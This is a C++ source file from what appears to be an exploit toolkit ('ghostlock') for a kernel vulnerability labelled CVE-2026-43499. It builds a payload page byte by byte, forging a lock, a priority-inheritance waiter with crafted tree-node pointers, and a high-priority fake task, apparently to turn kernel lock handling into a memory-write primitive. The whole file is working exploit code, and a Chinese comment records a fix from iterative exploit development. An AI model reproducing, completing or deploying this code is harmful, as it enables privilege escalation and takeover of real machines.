/** @file memory/payload_page.cpp
 *  The payload page, byte by byte, in the order the retired branch wrote it.
 */
#include "backend/cve_2026_43499/memory/payload_page.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    namespace {
        /** Whether a field of @p width bytes at @p at fits in @p capacity. */
        bool fits(std::size_t capacity, std::size_t at, std::size_t width) noexcept {
            return at <= capacity && width <= capacity - at;
        }

        void put32(std::uint8_t *page, std::size_t at, std::uint32_t value) noexcept {
            for (std::size_t i = 0U; i < sizeof(value); ++i) {
                page[at + i] = static_cast<std::uint8_t>((value >> (8U * i)) & 0xFFU);
            }
        }

        void put64(std::uint8_t *page, std::size_t at, std::uint64_t value) noexcept {
            for (std::size_t i = 0U; i < sizeof(value); ++i) {
                page[at + i] = static_cast<std::uint8_t>((value >> (8U * i)) & 0xFFU);
            }
        }

        /** One pointer-sized field, at the target's width rather than always eight bytes. */
        void put_pointer(std::uint8_t *page, std::size_t at, std::uint64_t value,
                         std::size_t width) noexcept {
            for (std::size_t i = 0U; i < width; ++i) {
                page[at + i] = static_cast<std::uint8_t>((value >> (8U * i)) & 0xFFU);
            }
        }
    }  // namespace

    PayloadPageVerdict build_payload_page(std::uint8_t *page, std::size_t capacity,
                                          const PayloadPageInputs &inputs, const WriteRequest &request,
                                          const WriteLayout &layout) noexcept {
        if (page == nullptr || capacity == 0U) {
            return PayloadPageVerdict::NoRoom;
        }
        if (inputs.pointer_bytes == 0U || inputs.pointer_bytes > sizeof(std::uint64_t)) {
            return PayloadPageVerdict::WidthInvalid;
        }
        /* A slot the profile did not declare is not a slot at zero: a page built there would put an
         *  object on top of whatever else lives at that offset. */
        if (inputs.slots.lock == 0U || inputs.slots.waiter == 0U || inputs.slots.fake_task == 0U) {
            return PayloadPageVerdict::SlotsInvalid;
        }
        const std::size_t pointer = inputs.pointer_bytes;
        const std::size_t lock_at = inputs.slots.lock;
        const std::size_t waiter_at = inputs.slots.waiter;
        const std::size_t task_at = inputs.slots.fake_task;

        /* The object slots first, in the retired order, so that a page too small for them is refused
         *  before any field offset is considered. */
        if (!fits(capacity, lock_at, pointer) || !fits(capacity, waiter_at, pointer) ||
            !fits(capacity, task_at, pointer)) {
            return PayloadPageVerdict::NoRoom;
        }

        /* Every field of every object, checked before the first store. */
        const bool lock_fields_fit =
            fits(capacity, lock_at + inputs.lock.owner, 4U) &&
            fits(capacity, lock_at + inputs.lock.wait_lock, 8U) &&
            fits(capacity, lock_at + inputs.lock.wait_list, 8U) &&
            fits(capacity, lock_at + inputs.lock.list_link, pointer);
        const bool waiter_fields_fit =
            fits(capacity, waiter_at + inputs.waiter.head_word, 8U) &&
            fits(capacity, waiter_at + inputs.waiter.head_next, 8U) &&
            fits(capacity, waiter_at + inputs.waiter.head_prev, 8U) &&
            fits(capacity, waiter_at + inputs.waiter.pc, pointer) &&
            fits(capacity, waiter_at + inputs.waiter.right, pointer) &&
            fits(capacity, waiter_at + inputs.waiter.left, pointer) &&
            fits(capacity, waiter_at + inputs.waiter.task, pointer) &&
            fits(capacity, waiter_at + inputs.waiter.lock, pointer) &&
            fits(capacity, waiter_at + inputs.waiter.wake_state, 4U) &&
            fits(capacity, waiter_at + inputs.waiter.prio, 4U) &&
            fits(capacity, waiter_at + inputs.waiter.deadline, 8U) &&
            fits(capacity, waiter_at + inputs.waiter.ww_ctx, pointer);
        const bool task_fields_fit =
            fits(capacity, task_at + inputs.task.usage, 4U) &&
            fits(capacity, task_at + inputs.task.prio, 4U) &&
            fits(capacity, task_at + inputs.task.normal_prio, 4U) &&
            fits(capacity, task_at + inputs.task.pi_lock, 4U) &&
            fits(capacity, task_at + inputs.task.pi_waiters, 16U) &&
            fits(capacity, task_at + inputs.task.group, pointer) &&
            fits(capacity, task_at + inputs.task.pi_top_task, pointer) &&
            fits(capacity, task_at + inputs.task.pi_blocked_on, pointer);
        if (!lock_fields_fit || !waiter_fields_fit || !task_fields_fit) {
            return PayloadPageVerdict::NoRoom;
        }

        /* The fabricated lock: unheld in the owner word, its list pointing at the fabricated
         *  waiter's first word, and the list node's low bit set on the task pointer, which is how the
         *  retired page marks the link as belonging to a held lock. */
        put32(page, lock_at + inputs.lock.owner, 0U);
        put64(page, lock_at + inputs.lock.wait_lock, inputs.waiter_word);
        put64(page, lock_at + inputs.lock.wait_list, inputs.waiter_word);
        put_pointer(page, lock_at + inputs.lock.list_link, inputs.fake_task | 1U, pointer);

        /* The fabricated waiter: three head words, then the erase tuple from the encoder, then the
         *  two pointers that connect it to the fabricated task and lock. */
        put64(page, waiter_at + inputs.waiter.head_word, 1U);
        put64(page, waiter_at + inputs.waiter.head_next, 0U);
        put64(page, waiter_at + inputs.waiter.head_prev, 0U);
        const WaiterFieldOffsets tuple{inputs.waiter.pc, inputs.waiter.right, inputs.waiter.left};
        const WriteArm arm = arm_for(request, layout.value, pointer);
        if (encode_waiter_arm(page + waiter_at, capacity - waiter_at, tuple, arm, pointer) !=
            EncodeVerdict::Ok) {
            return PayloadPageVerdict::NoRoom;
        }
        put_pointer(page, waiter_at + inputs.waiter.task,
                    inputs.waiter_task != 0U ? inputs.waiter_task : inputs.fake_task, pointer);
        put_pointer(page, waiter_at + inputs.waiter.lock, inputs.fake_lock, pointer);
        /* ★★ 第 227 轮 ✓（权威 `origin/main:util.cpp:459-465` 逐字 ✓）：`RIGHT_OFF` / `LEFT_OFF`
         *  **各是三字节点** —— `+0x00 = fake_parent` ✓、`+0x08 = 0` ✓、`+0x10 = 0` ✓；
         *  而本树此前**只写了 waiter 的三单字** ✗ ⇒ 节点内缺两字 ⇒ 内核遍历时读到垃圾 ✗。 */
        const std::uint64_t node_owner = static_cast<std::uint64_t>(layout.parent);
        put_pointer(page, waiter_at + inputs.waiter.right + 0x00U, node_owner, pointer);
        put_pointer(page, waiter_at + inputs.waiter.right + 0x08U, 0U, pointer);
        put_pointer(page, waiter_at + inputs.waiter.right + 0x10U, 0U, pointer);
        put_pointer(page, waiter_at + inputs.waiter.left + 0x00U, node_owner, pointer);
        put_pointer(page, waiter_at + inputs.waiter.left + 0x08U, 0U, pointer);
        put_pointer(page, waiter_at + inputs.waiter.left + 0x10U, 0U, pointer);
        put32(page, waiter_at + inputs.waiter.wake_state, 0U);
        put32(page, waiter_at + inputs.waiter.prio, inputs.values.waiter_prio);
        put64(page, waiter_at + inputs.waiter.deadline, 0U);
        put_pointer(page, waiter_at + inputs.waiter.ww_ctx, 0U, pointer);

        /* The fabricated task: a usage count so it does not look dead, a priority above the
         *  real-time threshold, and every pi field cleared so it inherits nothing. */
        put32(page, task_at + inputs.task.usage, inputs.values.task_usage);
        put32(page, task_at + inputs.task.prio, inputs.values.task_prio);
        put32(page, task_at + inputs.task.normal_prio, inputs.values.task_prio);
        put32(page, task_at + inputs.task.pi_lock, 0U);
        put64(page, task_at + inputs.task.pi_waiters, 0U);
        put64(page, task_at + inputs.task.pi_waiters + 8U, 0U);
        put_pointer(page, task_at + inputs.task.group, inputs.task_group, pointer);
        put_pointer(page, task_at + inputs.task.pi_top_task, inputs.pi_top_task, pointer);
        put_pointer(page, task_at + inputs.task.pi_blocked_on, 0U, pointer);
        return PayloadPageVerdict::Ok;
    }
}  // namespace ghostlock::backend::cve_2026_43499::memory
